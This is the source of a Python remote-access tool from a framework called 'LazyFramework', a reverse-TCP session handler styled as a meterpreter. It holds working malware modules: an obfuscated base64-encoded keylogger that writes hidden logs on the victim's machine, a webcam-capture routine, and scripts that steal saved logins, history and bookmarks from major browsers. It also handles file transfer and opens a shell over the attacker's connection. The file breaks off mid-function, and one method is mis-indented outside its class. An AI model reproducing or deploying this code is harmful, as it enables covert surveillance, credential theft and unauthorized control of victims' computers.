#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "Reverse TCP Multi-Payload Handler",
    "description": "Generate reverse TCP payloads + Multi-session handler dengan Keylogger, Webcam, Browser Data Extraction, dan Command Execution",
    "author": "LazyFramework",
    "platform": "multi",
    "rank": "Excellent",
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "default": "0.0.0.0",
        "required": True,
        "description": "Listen IP address (0.0.0.0 for all interfaces)"
    },
    "LPORT": {
        "default": 4444,
        "required": True,
        "description": "Listen port number"
    },
    "LANGUAGE": {
        "default": "python",
        "required": False,
        "description": "python|bash|powershell|php|perl|ruby|nodejs|c|cpp|all|none"
    },
    "OBF_LEVEL": {
        "default": "medium",
        "required": False,
        "description": "low|medium|high (obfuscation level)"
    },
    "USE_BASE64": {
        "default": True,
        "required": False,
        "description": "true|false (encode payload with base64)"
    },
    "AUTO_HANDLE": {
        "default": True,
        "required": False,
        "description": "true|false (auto-handle incoming sessions)"
    }
}

import socket
import threading
import time
import base64
import random
import string
import os
import sys
import select
import json
from datetime import datetime

# Global sessions
SESSIONS = {}
SESSIONS_LOCK = threading.RLock()

# Ganti definisi warna di bagian atas file reverse_tcp.py (sekitar baris 60-70):

RED = '[red]'
GREEN = '[green]'
YELLOW = '[yellow]'
BLUE = '[blue]'
MAGENTA = '[magenta]'
CYAN = '[cyan]'
WHITE = '[white]'
RESET = '[/]'


# Fungsi untuk membersihkan warna untuk GUI
def strip_colors(text):
    """Hapus semua tag warna [yellow], [green], dll"""
    import re
    # Hapus semua tag [color] dan [/]
    text = re.sub(r'\[/?[a-zA-Z0-9_]+\]', '', text)
    # Hapus ANSI escape codes
    text = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', text)
    return text

# ==================== OS DETECTION ====================
def detect_os_from_socket(sock):
    """Detect OS from socket connection"""
    os_signals = [
        (b"echo $OSTYPE 2>/dev/null", ['linux', 'linux-gnu', 'darwin', 'freebsd', 'openbsd']),
        (b"echo %OS% 2>nul", ['windows_nt', 'windows']),
        (b"uname -s 2>/dev/null", ['linux', 'darwin', 'freebsd', 'sunos']),
        (b"ver 2>nul", ['windows'])
    ]
    
    for cmd, keywords in os_signals:
        try:
            sock.send(cmd + b"\n")
            time.sleep(0.5)
            ready = select.select([sock], [], [], 2)
            if ready[0]:
                data = sock.recv(1024).decode('utf-8', errors='ignore').lower()
                for kw in keywords:
                    if kw in data:
                        if 'windows' in kw or 'win' in data:
                            return 'windows'
                        elif 'darwin' in data or 'mac' in data:
                            return 'macos'
                        elif 'linux' in data or 'gnu' in data:
                            return 'linux'
                        elif 'freebsd' in data:
                            return 'freebsd'
                        elif 'openbsd' in data:
                            return 'openbsd'
        except:
            continue
    
    return 'unknown'

# ==================== KEYLOGGER MODULE ====================
class KeyloggerModule:
    @staticmethod
    def start_keylogger(sock):
        keylogger_script = '''
import sys
import threading
import time
import os

try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

log_file = "/tmp/.keylog.txt" if sys.platform != "win32" else os.environ['TEMP'] + "\\\\keylog.txt"
keys = []
running = True

def on_press(key):
    if not running:
        return False
    try:
        if hasattr(key, 'char') and key.char:
            keys.append(key.char)
        else:
            keys.append(f'[{str(key)}]')
    except:
        keys.append('[?]')
    
    if len(keys) >= 100:
        save_logs()

def save_logs():
    global keys
    if keys:
        try:
            with open(log_file, 'a') as f:
                f.write(''.join(keys))
            keys = []
        except:
            pass

def start():
    global running
    if not HAS_PYNPUT:
        return
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while running:
        time.sleep(30)
        save_logs()

if __name__ == "__main__":
    start()
'''
        b64_script = base64.b64encode(keylogger_script.encode()).decode()
        cmd = f"python3 -c 'import base64; exec(base64.b64decode(\"{b64_script}\").decode())' 2>/dev/null &"
        sock.send(cmd.encode())
        return "[KEYLOGGER] Started"
    
    @staticmethod
    def get_logs(sock, os_type):
        if os_type == 'windows':
            cmd = "type %TEMP%\\keylog.txt 2>nul"
        else:
            cmd = "cat /tmp/.keylog.txt 2>/dev/null"
        sock.send(cmd.encode())
        time.sleep(1)
        ready = select.select([sock], [], [], 3)
        if ready[0]:
            data = sock.recv(8192).decode('utf-8', errors='ignore')
            return data if data else "[KEYLOGGER] No logs found"
        return "[KEYLOGGER] No logs found"
    
    @staticmethod
    def stop_keylogger(sock, os_type):
        if os_type == 'windows':
            cmd = "taskkill /F /IM python.exe 2>nul"
        else:
            cmd = "pkill -f 'python3.*keylog' 2>/dev/null"
        sock.send(cmd.encode())
        return "[KEYLOGGER] Stopped"

# ==================== WEBCAM MODULE ====================
class WebcamModule:
    @staticmethod
    def capture_webcam(sock, os_type):
        script = '''
import cv2
import base64
cap = cv2.VideoCapture(0)
ret, frame = cap.read()
if ret:
    _, buffer = cv2.imencode('.jpg', frame)
    print(base64.b64encode(buffer).decode())
cap.release()
'''
        b64_script = base64.b64encode(script.encode()).decode()
        cmd = f"python3 -c 'import base64; exec(base64.b64decode(\"{b64_script}\").decode())' 2>/dev/null"
        sock.send(cmd.encode())
        time.sleep(2)
        ready = select.select([sock], [], [], 5)
        if ready[0]:
            data = sock.recv(65536).decode('utf-8', errors='ignore')
            if data and len(data) > 100:
                return data.strip()
        return None
    
    @staticmethod
    def save_photo(b64_data, filename=None):
        if not filename:
            filename = f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        try:
            with open(filename, 'wb') as f:
                f.write(base64.b64decode(b64_data))
            return f"[WEBCAM] Saved: {filename}"
        except:
            return "[WEBCAM] Failed to save"

# ==================== BROWSER DATA EXTRACTION MODULE ====================
class BrowserDataModule:
    """Extract browser data: credentials, cookies, history, bookmarks"""
    
    @staticmethod
    def extract_browser_data(sock, os_type):
        """Extract all browser data from target"""
        
        # Script untuk ekstraksi browser data
        browser_script = '''
import os
import sys
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta

# Browser paths berdasarkan OS
def get_browser_paths():
    paths = {}
    
    if sys.platform == "win32":
        # Windows paths
        appdata = os.environ.get('LOCALAPPDATA', '')
        roaming = os.environ.get('APPDATA', '')
        
        paths['chrome'] = {
            'path': os.path.join(appdata, 'Google', 'Chrome', 'User Data'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['edge'] = {
            'path': os.path.join(appdata, 'Microsoft', 'Edge', 'User Data'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['brave'] = {
            'path': os.path.join(appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['opera'] = {
            'path': os.path.join(roaming, 'Opera Software', 'Opera Stable'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['firefox'] = {
            'path': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'type': 'firefox'
        }
        
    elif sys.platform == "darwin":
        # macOS paths
        home = os.path.expanduser("~")
        paths['chrome'] = {
            'path': os.path.join(home, 'Library', 'Application Support', 'Google', 'Chrome'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['firefox'] = {
            'path': os.path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles'),
            'type': 'firefox'
        }
        paths['safari'] = {
            'path': os.path.join(home, 'Library', 'Safari'),
            'type': 'safari'
        }
        
    else:
        # Linux paths
        home = os.path.expanduser("~")
        paths['chrome'] = {
            'path': os.path.join(home, '.config', 'google-chrome'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['chromium'] = {
            'path': os.path.join(home, '.config', 'chromium'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['firefox'] = {
            'path': os.path.join(home, '.mozilla', 'firefox'),
            'type': 'firefox'
        }
        paths['brave'] = {
            'path': os.path.join(home, '.config', 'Brave-Browser'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
        paths['vivaldi'] = {
            'path': os.path.join(home, '.config', 'vivaldi'),
            'login_db': 'Login Data',
            'history_db': 'History',
            'cookie_db': 'Cookies',
            'bookmark_file': 'Bookmarks'
        }
    
    return paths

def extract_chrome_data(browser_path, profile='Default'):
    data = {'passwords': [], 'cookies': [], 'history': [], 'bookmarks': []}
    
    try:
        # Extract passwords
        login_db = os.path.join(browser_path, profile, 'Login Data')
        if os.path.exists(login_db):
            temp_db = '/tmp/login_temp.db'
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                data['passwords'].append({
                    'url': row[0],
                    'username': row[1],
                    'password': '[ENCRYPTED]' if row[2] else ''
                })
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    try:
        # Extract history
        history_db = os.path.join(browser_path, profile, 'History')
        if os.path.exists(history_db):
            temp_db = '/tmp/history_temp.db'
            shutil.copy2(history_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                data['history'].append({
                    'url': row[0],
                    'title': row[1] if row[1] else '',
                    'time': str(row[2])
                })
            conn.close()
            os.remove(temp_db)
    except:
        pass
    
    try:
        # Extract bookmarks
        bookmark_file = os.path.join(browser_path, profile, 'Bookmarks')
        if os.path.exists(bookmark_file):
            with open(bookmark_file, 'r', encoding='utf-8') as f:
                bookmarks_data = json.load(f)
                # Parse bookmarks
                if 'roots' in bookmarks_data:
                    for root_name, root in bookmarks_data['roots'].items():
                        if 'children' in root:
                            for child in root['children']:
                                if child.get('type') == 'url':
                                    data['bookmarks'].append({
                                        'name': child.get('name', ''),
                                        'url': child.get('url', '')
                                    })
    except:
        pass
    
    return data

def extract_firefox_data(profiles_path):
    data = {'passwords': [], 'history': [], 'bookmarks': []}
    
    try:
        import glob
        profile_dirs = glob.glob(os.path.join(profiles_path, '*.default*'))
        
        for profile_dir in profile_dirs:
            # Extract cookies and passwords from logins.json
            logins_file = os.path.join(profile_dir, 'logins.json')
            if os.path.exists(logins_file):
                with open(logins_file, 'r', encoding='utf-8') as f:
                    logins_data = json.load(f)
                    if 'logins' in logins_data:
                        for login in logins_data['logins']:
                            data['passwords'].append({
                                'hostname': login.get('hostname', ''),
                                'username': login.get('encryptedUsername', '[ENCRYPTED]'),
                                'password': '[ENCRYPTED]'
                            })
            
            # Extract history from places.sqlite
            places_db = os.path.join(profile_dir, 'places.sqlite')
            if os.path.exists(places_db):
                temp_db = '/tmp/places_temp.db'
                shutil.copy2(places_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
                for row in cursor.fetchall():
                    data['history'].append({
                        'url': row[0],
                        'title': row[1] if row[1] else '',
                        'time': str(row[2])
                    })
                conn.close()
                os.remove(temp_db)
            
            # Extract bookmarks from places.sqlite
            if os.path.exists(places_db):
                conn = sqlite3.connect(temp_db if os.path.exists(temp_db) else places_db)
                cursor = conn.cursor()
                cursor.execute("SELECT b.title, p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1 LIMIT 100")
                for row in cursor.fetchall():
                    data['bookmarks'].append({
                        'name': row[0] if row[0] else '',
                        'url': row[1] if row[1] else ''
                    })
                conn.close()
                
    except:
        pass
    
    return data

def extract_safari_data(safari_path):
    data = {'history': [], 'bookmarks': []}
    
    try:
        # Safari history
        history_db = os.path.join(safari_path, 'History.db')
        if os.path.exists(history_db):
            temp_db = '/tmp/safari_history.db'
            shutil.copy2(history_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_time FROM history_items ORDER BY visit_time DESC LIMIT 100")
            for row in cursor.fetchall():
                data['history'].append({
                    'url': row[0],
                    'title': row[1] if row[1] else '',
                    'time': str(row[2])
                })
            conn.close()
            os.remove(temp_db)
            
        # Safari bookmarks
        bookmarks_db = os.path.join(safari_path, 'Bookmarks.plist')
        if os.path.exists(bookmarks_db):
            # plist parsing is complex, just note it exists
            data['bookmarks'].append({'note': 'Bookmarks.plist exists - need plist parser'})
            
    except:
        pass
    
    return data

def main():
    result = {}
    paths = get_browser_paths()
    
    for browser, browser_info in paths.items():
        browser_data = {}
        
        if browser_info.get('type') == 'firefox':
            browser_data = extract_firefox_data(browser_info['path'])
        elif browser_info.get('type') == 'safari':
            browser_data = extract_safari_data(browser_info['path'])
        else:
            # Chrome-based browsers
            if os.path.exists(browser_info['path']):
                # Try Default profile
                browser_data = extract_chrome_data(browser_info['path'], 'Default')
                # Try Profile 1
                if not browser_data['passwords'] and not browser_data['history']:
                    browser_data = extract_chrome_data(browser_info['path'], 'Profile 1')
        
        if browser_data.get('passwords') or browser_data.get('history') or browser_data.get('bookmarks'):
            result[browser] = browser_data
    
    # Output as JSON
    print(json.dumps(result, indent=2))

if __name__ == "__main__":
    main()
'''
        b64_script = base64.b64encode(browser_script.encode()).decode()
        cmd = f"python3 -c 'import base64; exec(base64.b64decode(\"{b64_script}\").decode())' 2>/dev/null"
        sock.send(cmd.encode())
        time.sleep(5)
        ready = select.select([sock], [], [], 15)
        if ready[0]:
            data = sock.recv(65536).decode('utf-8', errors='ignore')
            return data if data else "No browser data found"
        return "Timeout or no browser data"
    
    @staticmethod
    def save_browser_data(json_data, filename=None):
        """Save browser data to JSON file"""
        if not filename:
            filename = f"browser_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        try:
            with open(filename, 'w') as f:
                f.write(json_data)
            return f"[BROWSER] Data saved: {filename}"
        except:
            return "[BROWSER] Failed to save data"
    
    @staticmethod
    def format_output(json_data):
        """Format browser data for display"""
        try:
            data = json.loads(json_data)
            output = []
            output.append("\n" + "="*60)
            output.append("BROWSER DATA EXTRACTION REPORT")
            output.append("="*60)
            
            for browser, browser_data in data.items():
                output.append(f"\n[+] {browser.upper()}")
                output.append("-"*40)
                
                # Passwords
                if browser_data.get('passwords'):
                    output.append(f"  Passwords: {len(browser_data['passwords'])} found")
                    for pwd in browser_data['passwords'][:10]:
                        output.append(f"    URL: {pwd.get('url', '')[:50]}")
                        output.append(f"    User: {pwd.get('username', '')}")
                
                # History
                if browser_data.get('history'):
                    output.append(f"  History: {len(browser_data['history'])} entries")
                    for hist in browser_data['history'][:5]:
                        output.append(f"    {hist.get('title', 'No title')[:50]}")
                        output.append(f"    URL: {hist.get('url', '')[:60]}")
                
                # Bookmarks
                if browser_data.get('bookmarks'):
                    output.append(f"  Bookmarks: {len(browser_data['bookmarks'])} found")
                    for bm in browser_data['bookmarks'][:5]:
                        output.append(f"    {bm.get('name', 'No name')} -> {bm.get('url', '')[:50]}")
            
            output.append("\n" + "="*60)
            return "\n".join(output)
        except:
            return json_data
    
    @staticmethod
    def extract_credentials(sock, os_type):
        """Quick extract only credentials"""
        script = '''
import os
import sys
import json
import sqlite3
import shutil

def get_credentials():
    creds = []
    
    if sys.platform == "win32":
        chrome_path = os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data')
    elif sys.platform == "darwin":
        chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome")
    else:
        chrome_path = os.path.expanduser("~/.config/google-chrome")
    
    login_db = os.path.join(chrome_path, 'Default', 'Login Data')
    if os.path.exists(login_db):
        temp_db = '/tmp/creds.db'
        shutil.copy2(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value FROM logins LIMIT 50")
        for row in cursor.fetchall():
            creds.append({'url': row[0], 'username': row[1]})
        conn.close()
        os.remove(temp_db)
    
    print(json.dumps(creds))

if __name__ == "__main__":
    get_credentials()
'''
        b64_script = base64.b64encode(script.encode()).decode()
        cmd = f"python3 -c 'import base64; exec(base64.b64decode(\"{b64_script}\").decode())' 2>/dev/null"
        sock.send(cmd.encode())
        time.sleep(3)
        ready = select.select([sock], [], [], 8)
        if ready[0]:
            data = sock.recv(32768).decode('utf-8', errors='ignore')
            return data if data else "No credentials found"
        return "No credentials found"

# ==================== SESSION HANDLER ====================
class ReverseTCPSession:
    def __init__(self, session_id, client_socket, client_addr, lhost, lport):
        self.id = session_id
        self.socket = client_socket
        self.rhost, self.rport = client_addr
        self.lhost = lhost
        self.lport = lport
        self.type = "reverse_tcp"
        self.status = "alive"
        self.created = datetime.now().strftime("%H:%M:%S")
        self.os = detect_os_from_socket(client_socket)
        self.keylogger_active = False
        self.command_history = []
        
    def is_socket_alive(self):
        """Check if socket is still alive"""
        if not self.socket:
            return False
        
        try:
            self.socket.setblocking(False)
            try:
                self.socket.send(b'')
            except socket.error as e:
                if e.errno == 9:  # Bad file descriptor
                    return False
                elif e.errno == 32:  # Broken pipe
                    return False
            except BlockingIOError:
                pass
            finally:
                self.socket.setblocking(True)
            return True
        except Exception:
            return False
    
    def send_command(self, cmd, timeout=8):
        if not cmd or not cmd.strip():
            return ""
        
        # Filter perintah yang hanya berisi karakter khusus
        if cmd.strip() in ["===", "---", "***", ">>>", "<<<"]:
            return ""
        if not self.is_socket_alive():
 
            self.status = "dead"
            return "[!] Session connection lost"
        
        try:
            # Bersihkan dulu
            clean_cmd = strip_colors(cmd)
            self.socket.send((clean_cmd + "\n").encode('utf-8', errors='ignore'))
            time.sleep(0.4)  # beri waktu target proses
 
            result = ""
            self.socket.settimeout(timeout)
 
            while True:
                try:
                    data = self.socket.recv(16384).decode('utf-8', errors='ignore')
                    if not data:
                        break
 
                    # Bersihkan ANSI & control characters (comprehensive)
                    import re
                    data = re.sub(r'\x1b\][^\x07]*\x07', '', data)      # OSC sequences
                    data = re.sub(r'\x1b\[[\x20-\x3f]*[\x40-\x7e]', '', data)  # CSI (termasuk ?2004h)
                    #data = re.sub(r'\x1b[=><]', '', data)                  # ESC simple
                    #data = data.replace('\r\n', '\n').replace('\r', '\n')  # fix \r
                    data = re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]', '', data)
                    
                    result += data
                    
                    if len(data) < 4096:  # kemungkinan besar sudah selesai
                        break
                except socket.timeout:
                    break
                except Exception:
                    break
 
            self.socket.settimeout(None)
            return result.strip() if result else "[no output]"
 
        except Exception as e:
            self.status = "dead"
            return f"[!] Error: {e}"


    def spawn_pty_and_run(self, command):
        """Spawn PTY dan langsung jalankan command interaktif - FIXED VERSION"""
        if self.os == 'windows':
            return "[!] PTY tidak support di Windows"
        
        # Deteksi Python version
        python_cmd = self._detect_python()
        if not python_cmd:
            return "[!] Python tidak ditemukan di target"
        
        # Multi-method PTY spawn
        pty_script = f'''
    import sys
    import os
    import subprocess
    import time

    # Method 1: Try pty.spawn
    try:
        import pty
        import select
        
        def spawn_pty():
            # Set environment
            os.environ['TERM'] = 'xterm-256color'
            os.environ['LANG'] = 'en_US.UTF-8'
            
            # Fork PTY
            pid = os.fork()
            if pid == 0:
                # Child: spawn shell with command
                os.setsid()
                try:
                    os.execvp('/bin/bash', ['/bin/bash', '-c', '{command}'])
                except:
                    try:
                        os.execvp('/bin/sh', ['/bin/sh', '-c', '{command}'])
                    except:
                        try:
                            os.execvp('/usr/bin/bash', ['/usr/bin/bash', '-c', '{command}'])
                        except:
                            pass
                os._exit(0)
            else:
                # Parent: wait
                os.waitpid(pid, 0)
        
        spawn_pty()
        
    except ImportError:
        # Method 2: Fallback using subprocess with PTY
        import subprocess
        
        try:
            # Try to spawn with pseudo-terminal
            master_fd, slave_fd = os.openpty()
            pid = os.fork()
            if pid == 0:
                os.setsid()
                os.dup2(slave_fd, 0)
                os.dup2(slave_fd, 1)
                os.dup2(slave_fd, 2)
                os.close(master_fd)
                os.execvp('/bin/bash', ['/bin/bash', '-c', '{command}'])
            else:
                os.close(slave_fd)
                os.waitpid(pid, 0)
                os.close(master_fd)
        except:
            # Method 3: Simple subprocess
            subprocess.run('{command}', shell=True)
    '''
        
        import base64
        b64_script = base64.b64encode(pty_script.encode()).decode()
        cmd = f"{python_cmd} -c 'import base64; exec(base64.b64decode(\"{b64_script}\").decode())' 2>/dev/null &"
        
        result = self.send_command(cmd, timeout=3)
        return f"[PTY] Running: {command}"

def _detect_python(self):
    """Deteksi Python yang tersedia di target"""
    test_cmds = ['python3', 'python', 'python2']
    
    for py_cmd in test_cmds:
        # Test if python exists
        self.send_command(f"which {py_cmd} 2>/dev/null || command -v {py_cmd} 2>/dev/null", timeout=2)
        import select
        ready = select.select([self.socket], [], [], 1)
        if ready[0]:
            try:
                data = self.socket.recv(1024).decode('utf-8', errors='ignore')
                if data.strip() and 'not found' not in data.lower():
                    return py_cmd
            except:
                pass
    
    return None

    
    def upload_file(self, local_path, remote_path=None):
        try:
            if not remote_path:
                remote_path = os.path.basename(local_path)
            
            with open(local_path, 'rb') as f:
                data = f.read()
            
            b64_data = base64.b64encode(data).decode()
            
            if self.os == 'windows':
                cmd = f"powershell -c \"[IO.File]::WriteAllBytes('{remote_path}', [Convert]::FromBase64String('{b64_data}'))\""
            else:
                cmd = f"echo '{b64_data}' | base64 -d > {remote_path}"
            
            self.send_command(cmd)
            return f"[UPLOAD] {local_path} -> {remote_path} ({len(data)} bytes)"
        except Exception as e:
            return f"[UPLOAD] Failed: {e}"
    
    def download_file(self, remote_path, local_path=None):
        try:
            if not local_path:
                local_path = os.path.basename(remote_path)
            
            if self.os == 'windows':
                cmd = f"powershell -c \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_path}'))\""
            else:
                cmd = f"base64 {remote_path} 2>/dev/null"
            
            result = self.send_command(cmd, timeout=30)
            
            if result and len(result) > 50:
                b64_data = result.strip()
                with open(local_path, 'wb') as f:
                    f.write(base64.b64decode(b64_data))
                return f"[DOWNLOAD] {remote_path} -> {local_path}"
            return f"[DOWNLOAD] Failed: {remote_path} not found"
        except Exception as e:
            return f"[DOWNLOAD] Error: {e}"
    
    def start_keylogger(self):
        result = KeyloggerModule.start_keylogger(self.socket)
        self.keylogger_active = True
        return result
    
    def get_keylogs(self):
        return KeyloggerModule.get_logs(self.socket, self.os)
    
    def stop_keylogger(self):
        result = KeyloggerModule.stop_keylogger(self.socket, self.os)
        self.keylogger_active = False
        return result
    
    def capture_webcam(self):
        b64_data = WebcamModule.capture_webcam(self.socket, self.os)
        if b64_data:
            filename = f"webcam_{self.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            return WebcamModule.save_photo(b64_data, filename)
        return "[WEBCAM] Failed to capture"
    
    def extract_browser_data(self):
        """Extract all browser data from target"""
        result = BrowserDataModule.extract_browser_data(self.socket, self.os)
        if result and len(result) > 100:
            formatted = BrowserDataModule.format_output(result)
            filename = f"browser_data_{self.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            BrowserDataModule.save_browser_data(result, filename)
            return formatted + f"\n[+] Full data saved to: {filename}"
        return "[BROWSER] No browser data found"
    
    def extract_credentials(self):
        """Quick extract credentials only"""
        return BrowserDataModule.extract_credentials(self.socket, self.os)
    
    def spawn_shell(self):
        if self.os == 'windows':
            cmd = "start cmd.exe"
        else:
            cmd = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' 2>/dev/null"
        self.send_command(cmd)
        return "[SHELL] Spawning PTY shell..."


    
    
    def interactive_mode(self):
        """Terminal-like interactive mode with simple colors"""
        if getattr(self, '_gui_mode', False):
            return
        # Clear screen
        os.system('clear' if os.name != 'nt' else 'cls')
        
        # Header with simple colors
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗{RESET}
{YELLOW}║                    LAZYFRAMEWORK METERPRETER                      ║{RESET}
{YELLOW}╠══════════════════════════════════════════════════════════════════╣{RESET}
{YELLOW}║{RESET}  {GREEN}Session ID{RESET} : {WHITE}{self.id}{RESET:<63}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Target     :{RESET} {WHITE}{self.rhost}:{self.rport}{RESET:<53}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Listener   :{RESET} {WHITE}{self.lhost}:{self.lport}{RESET:<53}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}OS         :{RESET} {WHITE}{self.os.upper()}{RESET:<60}{YELLOW}║{RESET}
{YELLOW}║{RESET}  {GREEN}Status     :{RESET} {WHITE}{self.status}{RESET:<60}{YELLOW}║{RESET}
{YELLOW}╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
        
        # Command table
        self._show_help()
        
        print(f"\n{GREEN}[*] Connected to {self.rhost}:{self.rport} ({self.os.upper()}){RESET}")
        print(f"{GREEN}[*] Type 'help' for commands, 'exit' to close{RESET}\n")
        
        while self.status == "alive":
            if not self.is_socket_alive():
                print(f"\n{RED}[-] Session {self.id} connection lost{RESET}")
                break
            
            try:
                try:
                    if not sys.stdin or sys.stdin.fileno() < 0:
                        import time
                        time.sleep(1)
                        continue
                    cmd = input(f"{MAGENTA}lzf-meterpreter{RESET}{YELLOW}>{RESET} ")
                except (OSError, IOError) as e:
                    if hasattr(e, 'errno') and e.errno == 9:
                        print(f"\n{RED}[-] Session {self.id} terminated{RESET}")
                        break
                    import time
                    time.sleep(1)
                    continue
                
                if not cmd.strip():
                    continue
                
                self.command_history.append(cmd)
                cmd_lower = cmd.lower().strip()
                
                if cmd_lower in ['exit', 'quit']:
                    print(f"{YELLOW}[*] Closing session {self.id}...{RESET}")
                    break
                
                elif cmd_lower == 'help':
                    self._show_help()
                
                elif cmd_lower == 'info':
                    self._show_info()
                
                elif cmd_lower == 'sessions':
                    self._show_sessions()
                
                elif cmd_lower == 'clear':
                    os.system('clear' if os.name != 'nt' else 'cls')
                    continue
                
                elif cmd_lower == 'browser':
                    print(f"{YELLOW}[*] Extracting browser data... (this may take a moment){RESET}")
                    result = self.extract_browser_data()
                    print(f"{CYAN}{result}{RESET}")
                
                elif cmd_lower == 'browser creds':
                    print(f"{YELLOW}[*] Extracting saved credentials...{RESET}")
                    result = self.extract_credentials()
                    print(f"{CYAN}{result}{RESET}")
                
                elif cmd_lower.startswith('upload '):
                    parts = cmd.split()
                    if len(parts) >= 2:
                        local_file = parts[1]
                        remote_file = parts[2] if len(parts) > 2 else None
                        result = self.upload_file(local_file, remote_file)
                        print(f"{CYAN}{result}{RESET}")
                    else:
                        print(f"{YELLOW}[-] Usage: upload <local_file> [remote_file]{RESET}")
                
                elif cmd_lower.startswith('download '):
                    parts = cmd.split()
                    if len(parts) >= 2:
                        remote_file = parts[1]
                        local_file = parts[2] if len(parts) > 2 else None
                        result = self.download_file(remote_file, local_file)
                        print(f"{CYAN}{result}{RESET}")
                    else:
                        print(f"{YELLOW}[-] Usage: download <remote_file> [local_file]{RESET}")
                
                elif cmd_lower == 'keylogger start':
                    print(f"{YELLOW}{self.start_keylogger()}{RESET}")
                
                elif cmd_lower == 'keylogger stop':
                    print(f"{YELLOW}{self.stop_keylogger()}{RESET}")
                
                elif cmd_lower == 'keylogger get':
                    print(f"{YELLOW}{self.get_keylogs()}{RESET}")
                
                elif cmd_lower == 'webcam':
                    print(f"{YELLOW}[*] Capturing webcam...{RESET}")
                    result = self.capture_webcam()
                    print(f"{CYAN}{result}{RESET}")
                
                elif cmd_lower == 'shell':
                    print(f"{YELLOW}{self.spawn_shell()}{RESET}")
                    print(f"{YELLOW}[*] Type 'exit' to return to meterpreter{RESET}")

                elif cmd_lower.startswith('nano '):
                    filename = cmd[5:].strip()
                    result = self.spawn_pty_and_run(f'nano {filename}')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'nano':
                    result = self.spawn_pty_and_run('nano')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower.startswith('vim ') or cmd_lower.startswith('vi '):
                    filename = cmd[4:].strip() if cmd.startswith('vim') else cmd[3:].strip()
                    result = self.spawn_pty_and_run(f'vim {filename}')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'vim' or cmd_lower == 'vi':
                    result = self.spawn_pty_and_run('vim')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'htop':
                    result = self.spawn_pty_and_run('htop')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'top':
                    result = self.spawn_pty_and_run('top')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'mc':
                    result = self.spawn_pty_and_run('mc')
                    print(f"{CYAN}{result}{RESET}")

                elif cmd_lower == 'tmux':
                    result = self.spawn_pty_and_run('tmux')
                    print(f"{CYAN}{result}{RESET}")
                
                else:
                    print(f"{BLUE}[*] Executing: {cmd}{RESET}")
                    response = self.send_command(cmd)
                    if response:
                        print(f"{WHITE}{response}{RESET}")
                    else:
                        print(f"{BLUE}[*] Command executed (no output){RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[*] Press Ctrl+D or type 'exit' to close{RESET}")
                continue
            except EOFError:
                break
            except Exception as e:
                if "Bad file descriptor" in str(e):
                    print(f"\n{RED}[-] Session {self.id} connection lost{RESET}")
                    break
                print(f"{RED}[!] Error: {e}{RESET}")
        
        print(f"{RED}[-] Session {self.id} closed{RESET}")
        self.close()
    
    def _show_help(self):
        print(f"""
